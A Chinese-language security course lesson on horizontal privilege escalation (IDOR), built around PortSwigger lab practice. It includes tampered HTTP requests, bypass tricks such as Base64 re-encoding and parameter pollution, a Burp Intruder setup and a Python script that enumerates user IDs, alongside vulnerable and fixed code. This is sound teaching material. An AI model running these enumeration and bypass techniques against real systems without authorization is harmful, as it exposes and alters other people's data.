---
title: Day045：越权漏洞 - 水平越权（IDOR）
tags:
  - 网络安全
  - 越权
  - IDOR
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d045
date: 2026-03-08
updated: 2026-01-28
---

# Day045：越权漏洞 - 水平越权（IDOR）

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 8：认证与逻辑漏洞 |
| **今日主题** | 水平越权（IDOR）原理与利用 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你登录了一个电商网站，查看自己的订单 `/order?id=1001`。你好奇地把 `id` 改成 `1002`，竟然看到了别人的订单！
>
> **问题**：为什么改个参数就能看到别人的数据？
>
> **今天的任务**：学习越权漏洞——最常见、最容易被忽视、却危害巨大的逻辑漏洞。

---

## 今日目标

- [ ] 理解水平越权与垂直越权的区别
- [ ] 掌握 IDOR（不安全的直接对象引用）原理
- [ ] 学会发现和利用水平越权漏洞
- [ ] 完成实战练习

**闯关条件**：成功利用水平越权查看其他用户的敏感数据。

---

## 实战任务（先动手！）

### 任务 1：理解越权漏洞类型（20 分钟）

**越权漏洞分类**：

| 类型 | 描述 | 示例 |
|------|------|------|
| 水平越权 | 相同权限用户之间的越权 | 用户 A 看到用户 B 的订单 |
| 垂直越权 | 低权限用户执行高权限操作 | 普通用户执行管理员功能 |

**IDOR（Insecure Direct Object Reference）**：
```
不安全的直接对象引用
= 通过修改参数直接访问其他对象
= 水平越权的技术实现
```

**经典场景**：
```http
# 原始请求
GET /api/user/profile?user_id=1001 HTTP/1.1

# 越权请求（修改 user_id）
GET /api/user/profile?user_id=1002 HTTP/1.1
```

**记录**：
```
水平越权的本质：________________
```

---

### 任务 2：IDOR 漏洞挖掘实战（40 分钟）

**环境**：PortSwigger Web Security Academy - Access Control Labs

**常见 IDOR 参数**：
```
id, user_id, uid, account_id
order_id, transaction_id
file_id, doc_id
email, username
```

**挖掘步骤**：

**步骤 1：识别可控参数**
```http
# 抓包分析，找到包含 ID 的请求
GET /api/orders/12345 HTTP/1.1
POST /api/user/update
Content-Type: application/json

{"user_id": 1001, "email": "new@email.com"}
```

**步骤 2：准备测试账号**
```
账号 A：user_id = 1001
账号 B：user_id = 1002
分别登录，记录各自的资源 ID
```

**步骤 3：交叉测试**
```http
# 用账号 A 的 Session 访问账号 B 的资源
GET /api/orders/1002_order_id HTTP/1.1
Cookie: session=user_a_session
```

**记录**：
```
发现的可控参数：________________
越权测试结果：________________
```

---

### 任务 3：不同位置的 IDOR（35 分钟）

**位置 1：URL 路径参数**
```http
GET /users/1001/profile HTTP/1.1
↓
GET /users/1002/profile HTTP/1.1
```

**位置 2：查询参数**
```http
GET /download?file_id=abc123 HTTP/1.1
↓
GET /download?file_id=abc124 HTTP/1.1
```

**位置 3：POST Body**
```http
POST /api/update HTTP/1.1
Content-Type: application/json

{"account_id": 1001, "balance": 1000}
↓
{"account_id": 1002, "balance": 1000}
```

**位置 4：HTTP Header**
```http
GET /api/data HTTP/1.1
X-User-ID: 1001
↓
X-User-ID: 1002
```

**位置 5：Cookie 值**
```http
Cookie: user_id=1001
↓
Cookie: user_id=1002
```

**记录**：
```
测试的参数位置：________________
成功越权的位置：________________
```

---

### 任务 4：绕过常见防护（40 分钟）

**防护 1：参数加密/编码**
```
原始：user_id=1001
加密后：user_id=MTAwMQ==  (Base64)

绕过：解码后修改再编码
MTAwMQ== → 1001 → 1002 → MTAwMg==
```

**防护 2：使用 GUID/UUID**
```
原始：/user/550e8400-e29b-41d4-a716-446655440000

绕过方法：
1. 查找其他接口是否泄露了 UUID
2. 检查 API 响应是否包含其他用户 UUID
3. 暴力枚举（如果 UUID 不够随机）
```

**防护 3：多参数校验**
```http
# 服务器同时验证 user_id 和 token
POST /api/action
{"user_id": 1001, "token": "abc123"}

绕过：
1. 只修改 user_id，不改 token
2. 删除 token 参数
3. 尝试空 token
```

**实战：参数污染**
```http
# 参数污染可能绕过校验
GET /profile?user_id=1001&user_id=1002

# 不同服务器处理方式不同
# Apache：取第一个
# Tomcat：取最后一个
# ASP.NET：合并
```

**记录**：
```
遇到的防护方式：________________
绕过方法：________________
```

---

### 任务 5：批量 IDOR 测试（35 分钟）

**使用 Burp Intruder 批量测试**：

**步骤 1：捕获请求**
```http
GET /api/user/1001/orders HTTP/1.1
```

**步骤 2：设置 Payload 位置**
```http
GET /api/user/§1001§/orders HTTP/1.1
```

**步骤 3：配置 Payload**
```
Payload type: Numbers
From: 1000
To: 1100
Step: 1
```

**步骤 4：分析结果**
```
- 200 响应：可能存在越权
- 不同长度响应：表示获取到了不同数据
- 403/401：正常拒绝
```

**自动化脚本**：
```python
import requests

base_url = "http://target.com/api/user/{}/orders"
headers = {"Cookie": "session=your_session"}

for user_id in range(1000, 1100):
    resp = requests.get(base_url.format(user_id), headers=headers)
    if resp.status_code == 200 and len(resp.text) > 100:
        print(f"[+] Possible IDOR: user_id={user_id}")
```

**记录**：
```
批量测试范围：________________
发现的越权点：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 理解 IDOR 原理 | 20 分 |
| 成功识别可控参数 | 20 分 |
| 成功实现水平越权 | 25 分 |
| 掌握绕过技巧 | 20 分 |
| 完成批量测试 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### 为什么会存在 IDOR？

```
根本原因：信任了客户端提供的标识符

错误代码示例：
def get_order(request):
    order_id = request.GET['id']  # 直接使用客户端参数
    order = Order.objects.get(id=order_id)  # 没有验证所有权
    return order

正确代码示例：
def get_order(request):
    order_id = request.GET['id']
    user = request.user  # 获取当前登录用户
    order = Order.objects.get(id=order_id, user=user)  # 验证所有权
    return order
```

### IDOR 的危害等级

| 场景 | 影响 | 危害等级 |
|------|------|----------|
| 查看他人公开信息 | 低 | 低 |
| 查看他人订单/交易 | 隐私泄露 | 中 |
| 修改他人数据 | 数据篡改 | 高 |
| 删除他人资源 | 数据破坏 | 高 |
| 访问管理后台 | 权限提升 | 严重 |

### 常见易受攻击的功能

```
1. 个人资料查看/编辑
2. 订单详情
3. 账单/交易记录
4. 文件下载
5. 密码重置链接
6. API 接口
7. 导出功能
8. 删除功能
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| ID 加密 | 参数是乱码 | 尝试 Base64、URL 解码 |
| UUID 太随机 | 无法枚举 | 寻找 UUID 泄露点 |
| 返回一样 | 分不清是否越权 | 对比两个账户的真实数据 |
| 需要多步骤 | 单一请求无效 | 分析完整业务流程 |

---

## 知识卡片速查

### IDOR 测试清单

```
1. 找参数：URL、Body、Header、Cookie
2. 换 ID：数字递增、UUID 替换
3. 看响应：状态码、响应长度、内容对比
4. 试绕过：编码、参数污染、空值
5. 批量跑：Burp Intruder、脚本
```

### 常见参数名

```
用户标识：id, user_id, uid, account_id, username, email
资源标识：order_id, file_id, doc_id, record_id
其他：token, ref, key, hash
```

### 快速测试 Payload

```
数字递增：1001 → 1002
数字递减：1001 → 1000
极端值：0, -1, 999999
自己的其他 ID：替换成自己其他账号
已知用户：admin, root, test
```

---

## 常见问题

**Q1：IDOR 和未授权访问有什么区别？**

A1：
- IDOR：已登录用户访问其他用户的资源
- 未授权访问：未登录就能访问需要登录的资源
- IDOR 是逻辑漏洞，未授权访问是认证缺失

**Q2：UUID 是否能防止 IDOR？**

A2：不一定：
- 真正随机的 UUID 难以枚举
- 但 UUID 可能在其他地方泄露（日志、API 响应、前端代码）
- 根本解决还是要做权限校验

**Q3：如何证明 IDOR 的危害？**

A3：
1. 截图显示访问了其他用户的敏感数据
2. 对比两个账户的真实数据确认
3. 说明可能造成的业务影响
4. 避免实际修改或删除他人数据

---

## 明日预告

**Day 046：越权漏洞 - 垂直越权**

明天你将：
- 学习垂直越权原理
- 掌握权限提升技巧
- 分析真实案例

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 发现的 IDOR 漏洞 | |
| 使用的测试工具 | |
| 今日收获 | |

---

> **导师点评**：
>
> IDOR 是最容易被低估的漏洞类型。
>
> 开发者总觉得"用户不会乱改参数"——但攻击者的工作就是"乱改参数"。
>
> 这类漏洞不需要高深的技术，只需要一个好奇心：**"如果我改一下这个数字，会怎样？"**
>
> 很多赏金猎人靠 IDOR 吃饭。因为它太常见了——每个需要身份认证的系统都可能存在。
>
> **记住：永远不要信任客户端传来的任何标识符**。

```bash
echo "Day 045 Complete! IDOR 猎手入门！"
```
